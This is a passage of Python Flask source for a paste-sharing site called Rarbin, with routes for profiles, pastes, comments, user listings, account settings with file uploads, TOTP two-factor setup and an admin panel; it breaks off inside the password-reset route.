    cursor.execute("SELECT COUNT(*) FROM follows WHERE following_id = ?", (userid,))
    followers_count = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM follows WHERE follower_id = ?", (userid,))
    following_count = cursor.fetchone()[0]
    
    # Check if current user is following this user
    is_following = False
    current_username = session.get('username')
    if current_username and current_username != username:
        cursor.execute("SELECT id FROM users WHERE username = ?", (current_username,))
        current_user = cursor.fetchone()
        if current_user:
            cursor.execute("SELECT id FROM follows WHERE follower_id = ? AND following_id = ?", (current_user[0], userid))
            is_following = cursor.fetchone() is not None

    # Fetch profile comments
    profile_comments = []
    cursor.execute("""
        SELECT pc.*, u.username as commenter_username, u.status as commenter_status 
        FROM profile_comments pc
        LEFT JOIN users u ON pc.commenter_user_id = u.id
        WHERE pc.profile_user_id = ?
        ORDER BY pc.date DESC
    """, (userid,))
    profile_comments_raw = cursor.fetchall()
    
    for comment in profile_comments_raw:
        profile_comments.append({
            'id': comment[0],
            'commenter_user_id': comment[2],
            'comment': comment[3],
            'date': comment[4],
            'commenter_username': comment[5] if comment[5] else 'Anonymous',
            'loginstatus': comment[6] if comment[6] else 'anonymous'
        })

    return render_template(
        "profile.html",
        login=login,
        userid=userid,
        status=status,
        joined=joined,
        bio=bio,
        avatar=avatar,
        banner=banner,
        music=music,
        account_locked=account_locked,
        pastes=pastes_sorted,
        paste_count=paste_count,
        followers_count=followers_count,
        following_count=following_count,
        is_following=is_following,
        paste_comments_count=paste_comments_count,
        paste_comments_disabled=paste_comments_disabled,
        profile_comments=profile_comments,
        comment_count=len(profile_comments),
        username=session.get('username')
    )

@app.route("/post/<file>")
def post(file):
    cursor = conn.cursor()
    # Check if paste exists and get its data using url_name
    cursor.execute("SELECT * FROM pasts WHERE url_name = ?", (file,))
    paste = cursor.fetchone()
    if not paste:
        return redirect(url_for('index'))
    
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    cursor.execute('''
        SELECT p.*, u.username as owner_username
        FROM pasts p
        LEFT JOIN users u ON p.owner_id = u.id
        WHERE p.url_name = ?
    ''', (file,))
    result = cursor.fetchone()
    conn.row_factory = None

    # If paste is pending deletion, block access except for admin override
    if result and result['pending_deletion']:
        # Allow admin override if ?admin_view=1 and user is admin/root
        if request.args.get('admin_view') == '1':
            username = session.get('username')
            cursor.execute("SELECT status FROM users WHERE username = ?", (username,))
            user_status = cursor.fetchone()
            if user_status and user_status[0] in ['root', 'admin', 'manager']:
                pass  # allow access
            else:
                return redirect(url_for('index'))
        else:
            return redirect(url_for('index'))

    # Read the file content from disk - use URL-friendly name directly
    filename_path = os.path.join(ANON_PASTES, file)
    try:
        with open(filename_path, "r", encoding="utf-8") as filec:
            file_content = filec.read()
    except FileNotFoundError:
        # File not found - show error message
        return render_template(
            "post.html",
            filename=paste[2] if paste else file,
            url_name=file,
            ownerpast="Unknown",
            file_content="**Error: File not found**\n\nThe content for this paste could not be found on the server. This may be due to:\n- The file was deleted or moved\n- Database inconsistency\n- Server maintenance\n\nPlease contact an administrator if this issue persists.",
            creation_date="Unknown",
            creation_time="Unknown",
            view="0",
            is_pinned="False",
            comments=[],
            username=session.get('username'),
            status="anonymous",
            can_edit=False
        )
    except Exception as e:
        # File error - show error message
        return render_template(
            "post.html",
            filename=paste[2] if paste else file,
            url_name=file,
            ownerpast="Unknown",
            file_content="**Error: File not found**\n\nThe content for this paste could not be found on the server. This may be due to:\n- The file was deleted or moved\n- Database inconsistency\n- Server maintenance\n\nPlease contact an administrator if this issue persists.",
            creation_date="Unknown",
            creation_time="Unknown",
            view="0",
            is_pinned="False",
            comments=[],
            username=session.get('username'),
            status="anonymous",
            can_edit=False
        )

    # Session-based view cooldown logic
    cursor = conn.cursor()
    session_id = get_session_identifier()
    current_time = datetime.now(UTC_TZ)

    cursor.execute("SELECT last_viewed FROM post_views WHERE pastname = ? AND session_id = ?", (file, session_id))
    last_view = cursor.fetchone()

    should_increment_view = False
    if last_view:
        # Using strptime to parse the stored string time
        last_view_time = datetime.strptime(last_view[0], '%Y-%m-%d %H:%M:%S')
        # Localize the naive datetime object to UTC
        last_view_time = UTC_TZ.localize(last_view_time)
        
        # Check if 5 minutes have passed
        if current_time - last_view_time > timedelta(minutes=5):
            should_increment_view = True
            cursor.execute("UPDATE post_views SET last_viewed = ? WHERE pastname = ? AND session_id = ?",
                           (current_time.strftime('%Y-%m-%d %H:%M:%S'), file, session_id))
    else:
        should_increment_view = True
        cursor.execute("INSERT INTO post_views (pastname, session_id, last_viewed) VALUES (?, ?, ?)",
                       (file, session_id, current_time.strftime('%Y-%m-%d %H:%M:%S')))

    if should_increment_view:
        cursor.execute("UPDATE pasts SET view = view + 1 WHERE url_name = ?", (file,))
    
    conn.commit()

    username = session.get('username')

    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    bdus = cursor.fetchone()
    
    if bdus:
        statusus = bdus[3]
        user_id = bdus[0]
    else:
        statusus = "anonymous"
        user_id = None

    # Check if user can edit this paste
    can_edit = False
    if username and result:
        # User can edit if they are the owner
        if result['owner_id'] == user_id:
            can_edit = True

    if result:
        owner = result['owner_username'] or "Anonymous"
        creation_date = result['date']
        creation_time = result['hour']
        view = result['view']
        is_pinned = result['pin']
        comments = json.loads(result['comments']) if result['comments'] else []
        status = statusus
        # Use the original pastname for display
        display_title = result['pastname']
        comments_disabled = result['comments_disabled'] if 'comments_disabled' in result.keys() else False
    else:
        owner = "Anonymous"
        creation_date = "?"
        creation_time = "?"
        view = "?"
        is_pinned = "False"
        comments = []
        status = statusus
        display_title = file
        comments_disabled = False

    comments = get_comment_statuses(comments, cursor)

    return render_template(
        "post.html",
        filename=display_title,
        url_name=file,  # Add the URL-friendly name for delete comment links
        ownerpast=owner,
        file_content=file_content,
        creation_date=creation_date,
        creation_time=creation_time,
        view=view,
        is_pinned=is_pinned,
        comments=comments,
        username=username,
        status=status,
        can_edit=can_edit,
        comments_disabled=comments_disabled
    )

def get_comment_statuses(comments, cursor):
    for comment in comments:
        # Try to get user info by user_id first, then fallback to username
        user_id = comment.get('user_id')
        comment_login = comment.get('login')
        
        if user_id:
            # Look up by user ID (preferred method)
            cursor.execute("SELECT username, status FROM users WHERE id = ?", (user_id,))
            user_result = cursor.fetchone()
            if user_result:
                current_username, status = user_result
                comment['login'] = current_username  # Update to current username
                comment['loginstatus'] = status
            else:
                # User no longer exists, mark as anonymous
                comment['login'] = 'Anonymous'
                comment['loginstatus'] = 'anonymous'
        else:
            # Fallback to username lookup (for old comments)
            cursor.execute("SELECT status FROM users WHERE username = ?", (comment_login,))
            user_status = cursor.fetchone()
            comment['loginstatus'] = user_status[0] if user_status else "anonymous"
    
    # Sort by actual datetime (newest first); fallback safely if parsing fails
    return sorted(
        comments,
        key=lambda c: (
            datetime.strptime(c.get('date', ''), '%d-%m-%Y %H:%M:%S')
            if c.get('date')
            else datetime.min
        ),
        reverse=True,
    )

@app.route("/post/<file>/add_comment", methods=["POST"])
def add_comment(file):
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    cursor = conn.cursor()
    args = request.values
    captcha_response = args.get('g-recaptcha-response')

    captcha_secret_key = get_recaptcha_secret_key()
    captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
    captcha_data = {
        'secret': captcha_secret_key,
        'response': captcha_response
    }
    captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
    captcha_verification_result = captcha_verification_response.json()

    username = session.get('username')
    login = username if username else "Anonymous"

    try:
        # Check if paste exists and get its data using url_name
        cursor.execute("SELECT owner_id, date, hour, view, pin, comments_disabled FROM pasts WHERE url_name = ?", (file,))
        result = cursor.fetchone()
        
        if not result:
            return redirect(url_for('index'))
            
        owner_id, creation_date, creation_time, view, is_pinned, comments_disabled = result
        
        # Check if comments are disabled for this paste
        if comments_disabled:
            return redirect(url_for('post', file=file))
        
        # Get owner username
        owner = "Anonymous"
        if owner_id:
            cursor.execute("SELECT username FROM users WHERE id = ?", (owner_id,))
            owner_result = cursor.fetchone()
            if owner_result:
                owner = owner_result[0]
        
        # Get file content using sanitized filename
        sanitized_filename = sanitize_filename(file)
        filename = os.path.join(ANON_PASTES, sanitized_filename)
        try:
            with open(filename, "r", encoding="utf-8") as filec:
                content = filec.read()
        except:
            return redirect(url_for('index'))
        
        if captcha_verification_result['success']:
            comment = request.form.get("comment")

            # Backend validation for comment length
            if not comment or len(comment.strip()) == 0:
                return redirect(url_for('post', file=file))
            
            if len(comment) > 100:  # Limit comment length to 100 characters
                return redirect(url_for('post', file=file))

            cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
            bdus = cursor.fetchone()
            statusus = bdus[3] if bdus else "anonymous"

            if login and comment:
                # Use session-based cooldown instead of IP-based
                identifier = get_session_identifier()
                if not check_rate_limit(identifier, 'add_comment', max_attempts=1, window_seconds=60):
                    if statusus in ['user', 'anonymous']:
                        comments = get_comment_statuses([], cursor)
                        return render_template(
                            "post.html",
                            filename=file,
                            ownerpast=owner,
                            file_content=content,
                            creation_date=creation_date,
                            creation_time=creation_time,
                            view=view,
                            status=statusus,
                            is_pinned=is_pinned,
                            comments=comments,
                            username=username,
                            error="Cooldown! Please wait 60 seconds between comments."
                        )

                add_comment_to_post(file, login, comment)
                return redirect(url_for('post', file=file))
        else:
           return redirect(url_for('index'))
    except Exception as e:
        print(f"Error in add_comment: {e}")
        return redirect(url_for('index'))


@app.route("/tos")
def tos():
    with open(os.path.join(DATA, "tos"), "r", encoding="utf-8") as file:
        filec = file.read()
    return render_template("tos.html", file_content=filec, username=session.get('username'))


@app.route("/support")
def support():
    return render_template("support.html", username=session.get('username'))


@app.route("/hoa")
def hall_of_loosers():
    global loosers_list
    refreshLoosers()
    return render_template(
        "hoa.html",
        loosers_list=loosers_list,
        username=session.get('username')
    )

@app.route("/upgrades")
def upgrades():
        return render_template("upgrades.html", username=session.get('username'))

@app.route("/users")
def users():
    cursor = conn.cursor()
    query = request.args.get('search_query', '').strip()

    def get_user_comment_counts(users_list):
        """Get comment counts for a list of users"""
        comment_counts = {}
        for user in users_list:
            user_id = user[0]  # Assuming user ID is the first column
            cursor.execute("SELECT COUNT(*) FROM profile_comments WHERE profile_user_id = ?", (user_id,))
            count = cursor.fetchone()[0]
            comment_counts[user_id] = count
        return comment_counts

    def get_user_paste_counts(users_list):
        """Get paste counts for a list of users"""
        paste_counts = {}
        for user in users_list:
            user_id = user[0]  # Assuming user ID is the first column
            cursor.execute("SELECT COUNT(*) FROM pasts WHERE owner_id = ? AND (pending_deletion IS NULL OR pending_deletion = 0)", (user_id,))
            count = cursor.fetchone()[0]
            paste_counts[user_id] = count
        return paste_counts

    if query:
        cursor.execute("SELECT * FROM users WHERE username LIKE ?", (f"%{query}%",))
        filtered_users = cursor.fetchall()
        comment_counts = get_user_comment_counts(filtered_users)
        paste_counts = get_user_paste_counts(filtered_users)
        return render_template("users.html",
                               search_mode=True,
                               search_results=filtered_users,
                               search_query=query,
                               comment_counts=comment_counts,
                               paste_counts=paste_counts,
                               username=session.get('username'))
    else:
        root_users = cursor.execute('SELECT * FROM users WHERE status = "root"').fetchall()
        admin_users = cursor.execute('SELECT * FROM users WHERE status = "admin"').fetchall()
        manager_users = cursor.execute('SELECT * FROM users WHERE status = "manager"').fetchall()
        mod_users = cursor.execute('SELECT * FROM users WHERE status = "mod"').fetchall()
        council_users = cursor.execute('SELECT * FROM users WHERE status = "council"').fetchall()
        helper_users = cursor.execute('SELECT * FROM users WHERE status = "helper"').fetchall()
        rich_users = cursor.execute('SELECT * FROM users WHERE status = "rich"').fetchall()
        criminal_users = cursor.execute('SELECT * FROM users WHERE status = "criminal"').fetchall()
        vip_users = cursor.execute('SELECT * FROM users WHERE status = "vip"').fetchall()
        regular_users = cursor.execute('SELECT * FROM users WHERE status = "user"').fetchall()
        clique_users = cursor.execute('SELECT * FROM users WHERE status = "clique"').fetchall()
        
        # Get comment counts and paste counts for all user groups
        comment_counts = {}
        paste_counts = {}
        all_users = root_users + admin_users + manager_users + mod_users + council_users + helper_users + rich_users + criminal_users + vip_users + regular_users + clique_users
        comment_counts = get_user_comment_counts(all_users)
        paste_counts = get_user_paste_counts(all_users)
        
        return render_template("users.html",
                               root_users=root_users,
                               admin_users=admin_users,
                               manager_users=manager_users,
                               mod_users=mod_users,
                               council_users=council_users,
                               helper_users=helper_users,
                               rich_users=rich_users,
                               criminal_users=criminal_users,
                               vip_users=vip_users,
                               regular_users=regular_users,
                               clique_users=clique_users,
                               comment_counts=comment_counts,
                               paste_counts=paste_counts,
                               search_mode=False,
                               search_query=query,
                               username=session.get('username'))

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if 'username' not in session:
        return redirect(url_for('login'))

    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()

    cursor.execute("SELECT * FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()

    if request.method == 'POST':
        action = request.form.get('action')

        if action == 'update':
            # Verify reCAPTCHA
            args = request.values
            captcha_response = args.get('g-recaptcha-response')

            captcha_secret_key = get_recaptcha_secret_key()
            captcha_verify_url = 'https://www.google.com/recaptcha/api/siteverify'
            captcha_data = {
                'secret': captcha_secret_key,
                'response': captcha_response
            }
            captcha_verification_response = requests.post(captcha_verify_url, data=captcha_data)
            captcha_verification_result = captcha_verification_response.json()

            if not captcha_verification_result['success']:
                flash("reCAPTCHA verification failed. Please try again.", "error")
                return redirect(url_for('settings'))

            new_username = request.form.get('username')
            bio = request.form.get('bio')
            new_email = request.form.get('email')
            current_password = request.form.get('current_password')
            new_password = request.form.get('new_password')
            avatar_file = request.files.get('avatar_upload')
            banner_file = request.files.get('banner')
            music_file = request.files.get('music')
            remove_avatar = request.form.get('remove_avatar') == 'true'
            remove_banner = request.form.get('remove_banner') == 'true'
            remove_music = request.form.get('remove_music') == 'true'

            # Handle username change
            if new_username and new_username != user['username']:
                # Validate username using the same rules as registration
                username_valid, username_error = validate_username(new_username)
                if not username_valid:
                    flash(username_error, "error")
                    return redirect(url_for('settings'))
                
                # Check username change limit
                username_change_limit = get_username_change_limit(user['status'])
                current_username_changes = user['username_changes'] if user['username_changes'] is not None else 0
                
                if current_username_changes >= username_change_limit:
                    if username_change_limit == 0:
                        flash("Regular users cannot change their username.", "error")
                    else:
                        flash(f"You have reached your username change limit ({username_change_limit}).", "error")
                else:
                    # Case-insensitive uniqueness check; allow case-only change to same username
                    cursor.execute("SELECT id, username FROM users WHERE LOWER(username) = LOWER(?)", (new_username,))
                    existing = cursor.fetchone()
                    if not existing or existing['id'] == user['id']:
                        # If only casing changes, proceed; otherwise ensure uniqueness
                        # Update username and increment change count
                        cursor.execute("UPDATE users SET username = ?, username_changes = username_changes + 1 WHERE id = ?", (new_username, user['id']))
                        session['username'] = new_username # Update session
                        # Invalidate all other sessions for this user
                        invalidate_user_sessions(user['username'])
                        # Update session version for the current session
                        if new_username not in session_versions:
                            session_versions[new_username] = 0
                        session['session_version'] = session_versions[new_username]
                    else:
                        flash("Username already taken.", "error")

            # Handle Bio update (max 60 chars)
            if bio is not None:
                bio = bio[:70]
                cursor.execute("UPDATE users SET bio = ? WHERE id = ?", (bio, user['id']))

            # Handle email update (optional field)
            if new_email is not None:
                sanitized_new_email = (new_email or '').strip()
                current_email = (user['email'] or '').strip() if user['email'] is not None else ''

                if sanitized_new_email != current_email:
                    # Validate email format (allows empty to clear email)
                    is_valid_email, email_error = validate_email(sanitized_new_email)
                    if not is_valid_email:
                        flash(email_error or 'Invalid email.', 'error')
                        return redirect(url_for('settings'))

                    # Uniqueness check only when setting non-empty email
                    if sanitized_new_email:
                        cursor.execute("SELECT id FROM users WHERE lower(email) = lower(?)", (sanitized_new_email,))
                        existing = cursor.fetchone()
                        if existing and existing['id'] != user['id']:
                            flash('Email is already in use.', 'error')
                            return redirect(url_for('settings'))

                    cursor.execute("UPDATE users SET email = ? WHERE id = ?", (sanitized_new_email if sanitized_new_email else None, user['id']))
                    flash('Email updated successfully.', 'success')

            # Handle password change
            if current_password and new_password:
                if check_password_hash(user['password'], current_password):
                    new_password_hash = generate_password_hash(new_password)
                    cursor.execute("UPDATE users SET password = ? WHERE id = ?", (new_password_hash, user['id']))
                    # Invalidate all sessions for this user, including current
                    invalidate_user_sessions(user['username'])
                    # Commit changes before logging the user out to persist all updates
                    db.commit()
                    # Clear current session to force re-login
                    session.clear()
                    return redirect(url_for('login'))
                else:
                    flash("Incorrect current password.", "error")

            # Handle avatar removal
            if remove_avatar and user['avatar']:
                try:
                    os.remove(os.path.join(app.config['UPLOAD_FOLDER'], user['avatar']))
                except OSError: pass
                cursor.execute("UPDATE users SET avatar = NULL WHERE id = ?", (user['id'],))

            # Handle banner removal
            if remove_banner and user['banner']:
                try:
                    os.remove(os.path.join(app.config['BANNER_UPLOAD_FOLDER'], user['banner']))
                except OSError: pass
                cursor.execute("UPDATE users SET banner = NULL WHERE id = ?", (user['id'],))
                db.commit()

            # Handle avatar upload
            if avatar_file and avatar_file.filename != '':
                # Validate image file using security functions
                is_valid, error_message = validate_image_file(avatar_file)
                if not is_valid:
                    print(f"Avatar upload validation failed for user {user['username']}: {error_message}")
                    flash(f'Avatar upload failed: {error_message}', 'error')
                    return redirect(url_for('settings'))
                
                # Check if file is a GIF
                _, ext = os.path.splitext(avatar_file.filename or '')
                is_gif = ext.lower() == '.gif'
                
                # Define allowed statuses for GIF avatars
                allowed_gif_statuses = ['root', 'admin', 'manager', 'mod', 'council', 'helper', 'clique', 'rich', 'criminal', 'vip']
                
                # Block GIF uploads for regular users
                if is_gif and user['status'] not in allowed_gif_statuses:
                    flash('GIF profile pictures are only available for VIP users and above.', 'error')
                    return redirect(url_for('settings'))
                
                if user['avatar']: # Remove old avatar
                    try:
                        os.remove(os.path.join(app.config['UPLOAD_FOLDER'], user['avatar']))
                    except OSError: pass
                
                # Create secure filename
                avatar_filename = secure_filename_with_id(user['id'], avatar_file.filename)
                if not avatar_filename:
                    flash('Invalid file type for avatar upload.', 'error')
                    return redirect(url_for('settings'))
                
                # Save file temporarily for scanning
                temp_path = os.path.join(app.config['UPLOAD_FOLDER'], avatar_filename)
                avatar_file.save(temp_path)
                
                # Scan file for threats if enabled
                if SECURITY_CONFIG['ENABLE_FILE_SCANNING']:
                    scan_result, scan_message = scan_file_for_threats(temp_path)
                    if not scan_result:
                        # Remove the malicious file
                        try:
                            os.remove(temp_path)
                        except OSError:
                            pass
                        flash(f'File upload blocked: {scan_message}', 'error')
                        return redirect(url_for('settings'))
                
                cursor.execute("UPDATE users SET avatar = ? WHERE id = ?", (avatar_filename, user['id']))

            # Handle banner upload
            if banner_file and banner_file.filename != '':
                # Validate image file using security functions
                is_valid, error_message = validate_image_file(banner_file)
                if not is_valid:
                    print(f"Banner upload validation failed for user {user['username']}: {error_message}")
                    flash(f'Banner upload failed: {error_message}', 'error')
                    return redirect(url_for('settings'))
                
                if user['banner']: # Remove old banner
                    try:
                        os.remove(os.path.join(app.config['BANNER_UPLOAD_FOLDER'], user['banner']))
                    except OSError: pass
                
                # Create secure filename
                banner_filename = secure_filename_with_id(user['id'], banner_file.filename)
                if not banner_filename:
                    flash('Invalid file type for banner upload.', 'error')
                    return redirect(url_for('settings'))
                
                # Save file temporarily for scanning
                temp_path = os.path.join(app.config['BANNER_UPLOAD_FOLDER'], banner_filename)
                banner_file.save(temp_path)
                
                # Scan file for threats if enabled
                if SECURITY_CONFIG['ENABLE_FILE_SCANNING']:
                    scan_result, scan_message = scan_file_for_threats(temp_path)
                    if not scan_result:
                        # Remove the malicious file
                        try:
                            os.remove(temp_path)
                        except OSError:
                            pass
                        flash(f'File upload blocked: {scan_message}', 'error')
                        return redirect(url_for('settings'))
                
                cursor.execute("UPDATE users SET banner = ? WHERE id = ?", (banner_filename, user['id']))

            # Handle music removal
            if remove_music and user['music']:
                try:
                    os.remove(os.path.join(app.config['MUSIC_UPLOAD_FOLDER'], user['music']))
                except OSError: pass
                cursor.execute("UPDATE users SET music = NULL WHERE id = ?", (user['id'],))

            # Handle music upload
            if music_file and music_file.filename != '':
                # Check if user has permission to upload music
                allowed_music_statuses = ['root', 'admin', 'manager', 'mod', 'council', 'helper', 'clique', 'rich']
                
                if user['status'] not in allowed_music_statuses:
                    flash('Music upload is only available for Rich users and above.', 'error')
                    return redirect(url_for('settings'))
                
                # Validate music file using security functions
                is_valid, error_message = validate_music_file(music_file)
                if not is_valid:
                    print(f"Music upload validation failed for user {user['username']}: {error_message}")
                    flash(f'Music upload failed: {error_message}', 'error')
                    return redirect(url_for('settings'))
                
                # Remove old music file if it exists
                if user['music']:
                    try:
                        os.remove(os.path.join(app.config['MUSIC_UPLOAD_FOLDER'], user['music']))
                    except OSError: pass
                
                # Create secure filename
                music_filename = secure_filename_with_id(user['id'], music_file.filename)
                if not music_filename:
                    flash('Invalid file type for music upload.', 'error')
                    return redirect(url_for('settings'))
                
                # Save file temporarily for scanning
                temp_path = os.path.join(app.config['MUSIC_UPLOAD_FOLDER'], music_filename)
                music_file.save(temp_path)
                
                # Scan file for threats if enabled
                if SECURITY_CONFIG['ENABLE_FILE_SCANNING']:
                    scan_result, scan_message = scan_file_for_threats(temp_path)
                    if not scan_result:
                        # Remove the malicious file
                        try:
                            os.remove(temp_path)
                        except OSError:
                            pass
                        flash(f'File upload blocked: {scan_message}', 'error')
                        return redirect(url_for('settings'))
                
                cursor.execute("UPDATE users SET music = ? WHERE id = ?", (music_filename, user['id']))

            username_color = request.form.get('username_color')
            if user['username_color_access'] == 1 and username_color:
                cursor.execute("UPDATE users SET username_color = ? WHERE id = ?", (username_color, user['id']))

            db.commit()

        elif action == 'remove_avatar':
            if user['avatar']:
                try:
                    os.remove(os.path.join(app.config['UPLOAD_FOLDER'], user['avatar']))
                except OSError: pass
                cursor.execute("UPDATE users SET avatar = NULL WHERE id = ?", (user['id'],))
                db.commit()

        elif action == 'remove_banner':
            if user['banner']:
                try:
                    os.remove(os.path.join(app.config['BANNER_UPLOAD_FOLDER'], user['banner']))
                except OSError: pass
                cursor.execute("UPDATE users SET banner = NULL WHERE id = ?", (user['id'],))
                db.commit()

        elif action == 'remove_music':
            if user['music']:
                try:
                    os.remove(os.path.join(app.config['MUSIC_UPLOAD_FOLDER'], user['music']))
                except OSError: pass
                cursor.execute("UPDATE users SET music = NULL WHERE id = ?", (user['id'],))
                db.commit()

        return redirect(url_for('settings'))

    # GET request logic
    qr_code_image = None
    if not user['otp_enabled']:
        # Generate a new secret and QR code for setup
        otp_secret = pyotp.random_base32()
        session['otp_secret'] = otp_secret
        otp_uri = pyotp.totp.TOTP(otp_secret).provisioning_uri(
            name=user['username'], issuer_name='Rarbin'
        )
        
        qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=6, border=4)
        qr.add_data(otp_uri)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        
        buffered = io.BytesIO()
        img.save(buffered, format="PNG")
        qr_code_image = base64.b64encode(buffered.getvalue()).decode()

    return render_template('settings.html', user=user, qr_code_image=qr_code_image, username=session.get('username'))

@app.route('/enable-2fa', methods=['POST'])
def enable_2fa():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if 'username' not in session:
        return redirect(url_for('login'))

    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()

    token = request.form.get('token')
    otp_secret = session.get('otp_secret')

    if otp_secret and token and pyotp.TOTP(otp_secret).verify(token):
        cursor.execute("UPDATE users SET otp_secret = ?, otp_enabled = TRUE WHERE id = ?", (otp_secret, user['id']))
        db.commit()
        flash('2FA enabled successfully!', 'success')
        session.pop('otp_secret', None)
    else:
        flash('Invalid token. Please try again.', 'error')
    
    return redirect(url_for('settings'))

@app.route('/disable-2fa', methods=['POST'])
def disable_2fa():
    # CSRF token validation
    if CSRF_ENABLED:
        try:
            from flask_wtf.csrf import validate_csrf
            validate_csrf(request.form.get('csrf_token'))
        except Exception as e:
            return "Bad Request CSRF token is missing", 400
    
    if 'username' not in session:
        return redirect(url_for('login'))

    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()

    cursor.execute("UPDATE users SET otp_secret = NULL, otp_enabled = FALSE WHERE id = ?", (user['id'],))
    db.commit()
    flash('2FA disabled successfully!', 'success')
    
    return redirect(url_for('settings'))

def check_admin_access():
    """Check if current user has admin access for password reset generation"""
    if 'username' not in session:
        return False
    
    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    cursor.execute("SELECT status FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()
    
    if not user:
        return False
    
    # Allow root, admin, manager, mod, council, and helper to access admin panel
    allowed_statuses = ['root', 'admin', 'manager']
    return user['status'] in allowed_statuses

def check_root_admin_access():
    """Check if current user has root/admin access for sensitive operations"""
    if 'username' not in session:
        return False
    
    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    cursor.execute("SELECT status FROM users WHERE username = ?", (session['username'],))
    user = cursor.fetchone()
    
    if not user:
        return False
    
    # Only root and admin can perform sensitive operations
    allowed_statuses = ['root', 'admin', 'manager']
    return user['status'] in allowed_statuses

def generate_reset_token():
    """Generate a secure random token for password reset"""
    return secrets.token_urlsafe(32)

def log_admin_action(admin, action, details):
    db = get_db()
    cursor = db.cursor()
    now = datetime.now(UTC_TZ).strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('''
        INSERT INTO admin_logs (timestamp, admin, action, details)
        VALUES (?, ?, ?, ?)
    ''', (now, admin, action, details))
    db.commit()

def ensure_admin_logs_table():
    db = get_db()
    cursor = db.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admin_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            admin TEXT NOT NULL,
            action TEXT NOT NULL,
            details TEXT
        )
    ''')
    db.commit()

@app.route('/admin/panel')
def admin_panel():
    if not check_admin_access():
        flash('Access denied. You do not have permission to access the admin panel.', 'error')
        return redirect(url_for('index'))
    
    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    
    # Get current user's status for template access control
    cursor.execute("SELECT status FROM users WHERE username = ?", (session['username'],))
    current_user = cursor.fetchone()
    user_status = current_user['status'] if current_user else None
    
    # Ensure admin_logs table exists
    ensure_admin_logs_table()
    
    # Get total count of admin logs for pagination
    cursor.execute('SELECT COUNT(*) FROM admin_logs')
    total_logs = cursor.fetchone()[0]
    
    # Pagination variables
    per_page = 10
    current_page = request.args.get('page', 1, type=int)
    
    # Validate current_page
    if current_page < 1:
        current_page = 1
    
    total_pages = (total_logs + per_page - 1) // per_page
    
    # Adjust current_page if it exceeds total_pages
    if total_pages > 0 and current_page > total_pages:
        current_page = total_pages
    
    # Calculate offset for pagination
    offset = (current_page - 1) * per_page
    
    # Get admin logs with pagination
    cursor.execute('SELECT * FROM admin_logs ORDER BY timestamp DESC LIMIT ? OFFSET ?', (per_page, offset))
    admin_logs = cursor.fetchall()
    
    # Get flagged pastes
    cursor.execute('SELECT pastname, url_name, deletion_requested_by, deletion_requested_at, deletion_reason FROM pasts WHERE pending_deletion = 1')
    flagged_pastes = cursor.fetchall()
    
    # Get pending edit requests
    cursor.execute('''
        SELECT * FROM pending_edits 
        WHERE status = 'pending' 
        ORDER BY requested_at DESC
    ''')
    pending_edits = cursor.fetchall()
    
    # Get password reset tokens with user information
    cursor.execute('''
        SELECT prt.*, u.username 
        FROM password_reset_tokens prt 
        JOIN users u ON prt.user_id = u.id 
        ORDER BY prt.created_at DESC 
        LIMIT 20
    ''')
    reset_tokens_raw = cursor.fetchall()
    
    # Process reset tokens to add status
    reset_tokens = []
    now = datetime.now(UTC_TZ)
    for token in reset_tokens_raw:
        token_dict = dict(token)
        expires_at = datetime.strptime(token['expires_at'], '%d-%m-%Y %H:%M:%S')
        expires_at = UTC_TZ.localize(expires_at)
        
        if token['used']:
            token_dict['status'] = 'used'
        elif now > expires_at:
            token_dict['status'] = 'expired'
        else:
            token_dict['status'] = 'active'
        
        reset_tokens.append(token_dict)
    
    # Get reset link from session if it exists
    reset_link = session.pop('reset_link', None)
    
    # Get rarsint results from session if they exist
    rarsint_results = None
    rarsint_error = None
    if 'rarsint_results' in session:
        try:
            rarsint_results = session.pop('rarsint_results')
        except:
            pass
    if 'rarsint_error' in session:
        rarsint_error = session.pop('rarsint_error')
    
    return render_template('admin_panel.html', 
                         user_status=user_status,
                         username=session.get('username'),
                         admin_logs=admin_logs,
                         flagged_pastes=flagged_pastes,
                         pending_edits=pending_edits,
                         reset_tokens=reset_tokens,
                         reset_link=reset_link,
                         total_logs=total_logs,
                         per_page=per_page,
                         current_page=current_page,
                         total_pages=total_pages,
                         rarsint_results=rarsint_results,
                         rarsint_error=rarsint_error)

@app.route('/reset-password/<token>', methods=['GET', 'POST'])
def reset_password(token):
    db = get_db()
    db.row_factory = sqlite3.Row
    cursor = db.cursor()
    
    # Find the reset token
    cursor.execute('''
        SELECT prt.*, u.username 
        FROM password_reset_tokens prt 
        JOIN users u ON prt.user_id = u.id 
        WHERE prt.token = ?
    ''', (token,))
    reset_data = cursor.fetchone()
    
    if not reset_data:
        return render_template('reset_password.html', error='Invalid or expired reset token.')
    
    # Check if token is expired
